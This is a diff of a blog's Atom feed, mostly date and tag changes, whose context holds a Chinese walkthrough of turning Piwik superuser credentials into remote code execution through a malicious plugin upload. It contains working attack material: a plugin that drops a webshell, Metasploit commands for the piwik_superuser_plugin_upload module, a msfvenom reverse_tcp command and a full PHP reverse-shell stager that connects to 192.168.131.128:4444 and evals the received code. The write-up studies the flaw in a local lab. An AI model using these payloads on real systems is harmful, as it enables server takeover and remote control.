@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://fupinglee.github.io/"/>
-  <updated>2017-07-12T02:53:49.373Z</updated>
+  <updated>2017-07-12T05:21:58.176Z</updated>
   <id>https://fupinglee.github.io/</id>
   
   <author>
@@ -17,10 +17,10 @@
   
   <entry>
     <title>Piwik代码执行漏洞安全分析（附验证过程Getshell）</title>
-    <link href="https://fupinglee.github.io/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/"/>
-    <id>https://fupinglee.github.io/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/</id>
-    <published>2017-07-07T09:50:14.000Z</published>
-    <updated>2017-07-12T02:53:49.373Z</updated>
+    <link href="https://fupinglee.github.io/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/"/>
+    <id>https://fupinglee.github.io/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/</id>
+    <published>2017-07-12T09:50:14.000Z</published>
+    <updated>2017-07-12T05:21:58.176Z</updated>
     
     <content type="html"><![CDATA[<h3 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h3><p><a href="https://piwik.org/" target="_blank" rel="external">Piwik</a>是一个PHP和MySQL的开放源代码的Web统计软件. 它给你一些关于你的网站的实用统计报告，比如网页浏览人数, 访问最多的页面, 搜索引擎关键词等等。</p>
 <p>Piwik拥有众多不同功能的插件，你可以添加新的功能或是移除你不需要的功能，Piwik同样可以安装在你的服务器上面，数据就保存在你自己的服务器上面。你可以非常容易的插入统计图表到你的博客或是网站抑或是后台的控制面板中。安装完成后，你只需将一小段代码放到将要统计的网页中即可。</p>
@@ -41,27 +41,27 @@
 <p>程序版本：<a href="https://www.exploit-db.com/apps/cec6f1b03cc8ed4e62754919c5922d42-piwik-3.0.1.tar.gz" target="_blank" rel="external">3.0.1</a>(也可以在<a href="https://builds.piwik.org/" target="_blank" rel="external">https://builds.piwik.org/</a> 下载)</p>
 <h4 id="2-composer工具的安装"><a href="#2-composer工具的安装" class="headerlink" title="2.composer工具的安装"></a>2.composer工具的安装</h4><p>下载地址：<a href="https://getcomposer.org/Composer-Setup.exe" target="_blank" rel="external">https://getcomposer.org/Composer-Setup.exe</a></p>
 <p>下载后直接运行Composer-Setup.exe进行安装。</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/composer_setup_1.jpg" alt="composer安装"></p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/composer_setup_2.jpg" alt="选择PHP.exe的位置"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/composer_setup_1.jpg" alt="composer安装"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/composer_setup_2.jpg" alt="选择PHP.exe的位置"></p>
 <p>然后根据提示，继续下一步即可。</p>
 <blockquote>
 <p>注意：安装时PHP应开启php_openssl扩展，不然会报错。</p>
 </blockquote>
 <h4 id="3-Piwik程序的部署"><a href="#3-Piwik程序的部署" class="headerlink" title="3.Piwik程序的部署"></a>3.Piwik程序的部署</h4><p>将下载下来的程序源码解压到phpStudy下的WWW目录。这里我项目名字为piwik-3.0.1。</p>
 <p>在piwik-3.0.1目录下执行<code>composer install</code>命令来安装项目所依赖的代码库。</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/composer_setup_3.png" alt="依赖的代码库的安装"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/composer_setup_3.png" alt="依赖的代码库的安装"></p>
 <p>安装后在项目的根目录会出现一个vendor文件夹。</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/vendor_files.jpg" alt="vendor目录下文件"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/vendor_files.jpg" alt="vendor目录下文件"></p>
 <p>访问<a href="http://192.168.217.1/piwik-3.0.1/" target="_blank" rel="external">http://192.168.217.1/piwik-3.0.1/</a> 开始进行安装</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/Piwik_setup.jpg" alt="Piwik安装"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/Piwik_setup.jpg" alt="Piwik安装"></p>
 <p>点击Next进行下一步安装。</p>
 <p>数据库设置</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/Piwik_Database_setup.png" alt="数据库设置"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/Piwik_Database_setup.png" alt="数据库设置"></p>
 <p>超级用户设置</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/Piwik_superUser_set.jpg" alt="超级用户设置"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/Piwik_superUser_set.jpg" alt="超级用户设置"></p>
 <p>之后进行系统的设置，这里就省略过程了。</p>
 <p>安装完成后访问<a href="http://192.168.217.1/piwik-3.0.1/" target="_blank" rel="external">http://192.168.217.1/piwik-3.0.1/</a> 进行登陆。</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/piwik_login.jpg" alt="piwik登陆人口"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_login.jpg" alt="piwik登陆人口"></p>
 <blockquote>
 <p>用户名/密码为第五步中设置的超级用户。</p>
 </blockquote>
@@ -79,23 +79,23 @@
 <p>然后压缩为pwned.zip。</p>
 <p><strong>PayLoad的利用</strong></p>
 <p>利用创建的超级用户登陆，登陆后点击Administration或者访问<a href="http://192.168.217.1/piwik-3.0.1/index.php?module=CoreAdminHome&amp;action=home&amp;idSite=1&amp;period=day&amp;date=yesterday" target="_blank" rel="external">http://192.168.217.1/piwik-3.0.1/index.php?module=CoreAdminHome&amp;action=home&amp;idSite=1&amp;period=day&amp;date=yesterday</a></p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins.jpg" alt="piwik 插件人口"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins.jpg" alt="piwik 插件人口"></p>
 <p>安装新插件</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins_install.jpg" alt="piwik 安装新插件人口"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins_install.jpg" alt="piwik 安装新插件人口"></p>
 <p>上传新插件</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins_upload.jpg" alt="piwik 插件市场"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins_upload.jpg" alt="piwik 插件市场"></p>
 <p>插件上传</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins_uploading.jpg" alt="piwik 插件上传"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins_uploading.jpg" alt="piwik 插件上传"></p>
 <p>插件上传成功</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins_uploadsuccess.jpg" alt="piwik 插件上传成功"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins_uploadsuccess.jpg" alt="piwik 插件上传成功"></p>
 <p>然后点击激活插件按钮</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/plugin_activated.jpg" alt="插件激活"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/plugin_activated.jpg" alt="插件激活"></p>
 <p>插件激活后，会在根目录生成一个shell.php</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/shell.jpg" alt="shell"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/shell.jpg" alt="shell"></p>
 <h4 id="3-利用Metasploit生成meterpreter会话"><a href="#3-利用Metasploit生成meterpreter会话" class="headerlink" title="3.利用Metasploit生成meterpreter会话"></a>3.利用Metasploit生成meterpreter会话</h4><p>上面的结果是写入了WEBSHELL，也可以采用piwik_superuser_plugin_upload直接生成一个meterpreter会话。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/unix/webapp/piwik_superuser_plugin_upload </div><div class="line">msf exploit(piwik_superuser_plugin_upload) &gt; </div><div class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> PASSWORD admin888</div><div class="line">PASSWORD =&gt; admin888</div><div class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> RHOST 192.168.217.1</div><div class="line">RHOST =&gt; 192.168.217.1</div><div class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> TARGETURI /piwik-3.0.1/</div><div class="line">TARGETURI =&gt; /piwik-3.0.1/</div><div class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> USERNAME admin</div><div class="line">USERNAME =&gt; admin</div><div class="line">msf exploit(piwik_superuser_plugin_upload) &gt; exploit</div></pre></td></tr></table></figure>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/msf_win01.jpg" alt="脚本说明"></p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/msf_win02.jpg" alt="成功反弹生成meterpreter会话"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/msf_win01.jpg" alt="脚本说明"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/msf_win02.jpg" alt="成功反弹生成meterpreter会话"></p>
 <blockquote>
 <p>利用Metasploit时有时候会不成功，或者是第一次成功之后无法再次复现。但是利用上传webshell可以成功。</p>
 </blockquote>
@@ -103,19 +103,19 @@
 <p>这里仅仅用3.0.1举例，根据<a href="https://github.com/rapid7/metasploit-framework/pull/7917" target="_blank" rel="external">firefart</a>说的影响版本2.14.0/2.16.0/2.17.1/3.0.1，其他并未测试。</p>
 <p>Q:直接上传包含shell的压缩包可以吗？</p>
 <p>A:可以上传成功，但在plugins目录下无法执行php代码。</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/shell_forbidden.jpg" alt="plugins目录下无法执行php代码"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/shell_forbidden.jpg" alt="plugins目录下无法执行php代码"></p>
 <p>Q:Payload中除了install()方法还可以写其他方法吗？</p>
 <p>A:可以的。例如还有uninstall/deactivate/activate等方法，分别在卸载插件/关闭插件/激活插件的时候调用。例如如下的代码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">ff</span>;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ff</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</div><div class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span>//安装插件，执行一次</span></div><div class="line">  &#123;</div><div class="line">	$myfile = fopen(<span class="string">"install.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</div><div class="line">	$content = <span class="string">"install ..."</span>;</div><div class="line">	fwrite($myfile, $content);</div><div class="line">  &#125;  </div><div class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uninstall</span><span class="params">()</span>//卸载插件，执行一次</span></div><div class="line">  &#123;</div><div class="line">	$myfile = fopen(<span class="string">"uninstall.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</div><div class="line">	$content = <span class="string">"uninstall ..."</span>;</div><div class="line">	fwrite($myfile, $content);</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deactivate</span><span class="params">()</span>//关闭插件，可以多次执行</span></div><div class="line">  &#123;</div><div class="line">	$myfile = fopen(<span class="string">"deactivate.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</div><div class="line">	$content = <span class="string">"deactivate ..."</span>;</div><div class="line">	fwrite($myfile, $content);</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span><span class="params">()</span>//激活插件，可以多次执行</span></div><div class="line">  &#123;</div><div class="line">	$myfile = fopen(<span class="string">"activate.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</div><div class="line">	$content = <span class="string">"activate ..."</span>;</div><div class="line">	fwrite($myfile, $content);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>Q:可以上传WEBSHELL，但是利用Metasploit无法生成meterpreter会话，还想反弹shell怎么办？</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/msf_error.jpg" alt="无法生成meterpreter会话"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/msf_error.jpg" alt="无法生成meterpreter会话"></p>
 <p>A:可以利用手动上传插件的方法，将其中的Payload修改为反弹shell的代码。</p>
 <p>具体可以这样操作：</p>
 <p>首先看看Metasploit利用的Payload是什么。</p>
 <p>可以在generate_plugin方法中添加打印payload.encoded的语句，例如使用<code>print_status(&quot;data:#{payload.encoded}&quot;)</code>将其内容打印出来</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/payload_getdata.jpg" alt="打印Payload"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/payload_getdata.jpg" alt="打印Payload"></p>
 <p>然后使用<code>reload_all</code>重新加载脚本，并使用piwik_superuser_plugin_upload脚本，将会打印出来payload的内容</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/payload_datas.jpg" alt="payload内容"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/payload_datas.jpg" alt="payload内容"></p>
 <blockquote>
 <p>或者可以利用<code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.131.128 LPORT=4444 -f raw &gt;c.php</code>来生成payload，内容一样</p>
 </blockquote>
@@ -123,12 +123,12 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">pwned</span>;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwned</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</div><div class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span></span></div><div class="line">  &#123;</div><div class="line">    error_reporting(<span class="number">0</span>); </div><div class="line">	$ip = <span class="string">'192.168.131.128'</span>; </div><div class="line">	$port = <span class="number">4444</span>; </div><div class="line">	<span class="keyword">if</span> (($f = <span class="string">'stream_socket_client'</span>) &amp;&amp; is_callable($f)) &#123;</div><div class="line">		$s = $f(<span class="string">"tcp://&#123;$ip&#125;:&#123;$port&#125;"</span>); $s_type = <span class="string">'stream'</span>;</div><div class="line">	&#125; <span class="keyword">elseif</span> (($f = <span class="string">'fsockopen'</span>) &amp;&amp; is_callable($f)) &#123;</div><div class="line">		$s = $f($ip, $port); $s_type = <span class="string">'stream'</span>; </div><div class="line">	&#125; <span class="keyword">elseif</span> (($f = <span class="string">'socket_create'</span>) &amp;&amp; is_callable($f)) &#123;</div><div class="line">		$s = $f(AF_INET, SOCK_STREAM, SOL_TCP); </div><div class="line">		$res = @socket_connect($s, $ip, $port); </div><div class="line">		<span class="keyword">if</span> (!$res) &#123; <span class="keyword">die</span>(); &#125; </div><div class="line">		$s_type = <span class="string">'socket'</span>; </div><div class="line">	&#125; <span class="keyword">else</span> &#123; </div><div class="line">		<span class="keyword">die</span>(<span class="string">'no socket funcs'</span>);</div><div class="line">	&#125; <span class="keyword">if</span> (!$s) &#123; <span class="keyword">die</span>(<span class="string">'no socket'</span>); &#125; </div><div class="line">	<span class="keyword">switch</span> ($s_type) &#123; </div><div class="line">		<span class="keyword">case</span> <span class="string">'stream'</span>: $len = fread($s, <span class="number">4</span>); <span class="keyword">break</span>; </div><div class="line">		<span class="keyword">case</span> <span class="string">'socket'</span>: $len = socket_read($s, <span class="number">4</span>); <span class="keyword">break</span>; </div><div class="line">	&#125; </div><div class="line">	<span class="keyword">if</span> (!$len) &#123; <span class="keyword">die</span>(); &#125; </div><div class="line">	$a = unpack(<span class="string">"Nlen"</span>, $len); </div><div class="line">	$len = $a[<span class="string">'len'</span>]; </div><div class="line">	$b = <span class="string">''</span>; </div><div class="line">	<span class="keyword">while</span> (strlen($b) &lt; $len) &#123; </div><div class="line">		<span class="keyword">switch</span> ($s_type) &#123; </div><div class="line">		<span class="keyword">case</span> <span class="string">'stream'</span>: $b .= fread($s, $len-strlen($b)); <span class="keyword">break</span>; </div><div class="line">		<span class="keyword">case</span> <span class="string">'socket'</span>: $b .= socket_read($s, $len-strlen($b)); <span class="keyword">break</span>; </div><div class="line">		&#125; </div><div class="line">	&#125; </div><div class="line">	$GLOBALS[<span class="string">'msgsock'</span>] = $s; </div><div class="line">	$GLOBALS[<span class="string">'msgsock_type'</span>] = $s_type; </div><div class="line">	<span class="keyword">eval</span>($b);</div><div class="line">	<span class="keyword">die</span>();</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>然后就是利用上传插件来上传插件并激活了。</p>
 <p>正确姿势：</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/msf_ubuntu_success.jpg" alt="msf_ubuntu_success"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/msf_ubuntu_success.jpg" alt="msf_ubuntu_success"></p>
 <blockquote>
 <p>请注意要加<code>set PAYLOAD php/meterpreter/reverse_tcp</code>，不然会报各种错误。</p>
 </blockquote>
 <p>下面的为其中的错误。</p>
-<p><img src="/2017/07/07/Piwik-Superuser-Plugin-Upload-GetShell/msf_ubuntu.jpg" alt="msf_ubuntu"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/msf_ubuntu.jpg" alt="msf_ubuntu"></p>
 <h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p>[1]<a href="https://firefart.at/post/turning_piwik_superuser_creds_into_rce/" target="_blank" rel="external">https://firefart.at/post/turning_piwik_superuser_creds_into_rce/</a><br>[2]<a href="https://github.com/rapid7/metasploit-framework/pull/7917" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework/pull/7917</a></p>
 ]]></content>
     
@@ -142,9 +142,9 @@
       <category term="Exploit" scheme="https://fupinglee.github.io/categories/Exploit/"/>
     
     
-      <category term="piwik" scheme="https://fupinglee.github.io/tags/piwik/"/>
-    
       <category term="Metasploit" scheme="https://fupinglee.github.io/tags/Metasploit/"/>
+    
+      <category term="piwik" scheme="https://fupinglee.github.io/tags/piwik/"/>
     
       <category term="漏洞分析" scheme="https://fupinglee.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
@@ -504,9 +504,9 @@
       <category term="渗透测试" scheme="https://fupinglee.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
     
-      <category term="WEBSHELL" scheme="https://fupinglee.github.io/tags/WEBSHELL/"/>
-    
       <category term="MSSQL" scheme="https://fupinglee.github.io/tags/MSSQL/"/>
+    
+      <category term="WEBSHELL" scheme="https://fupinglee.github.io/tags/WEBSHELL/"/>
     
       <category term="ASPX" scheme="https://fupinglee.github.io/tags/ASPX/"/>
     
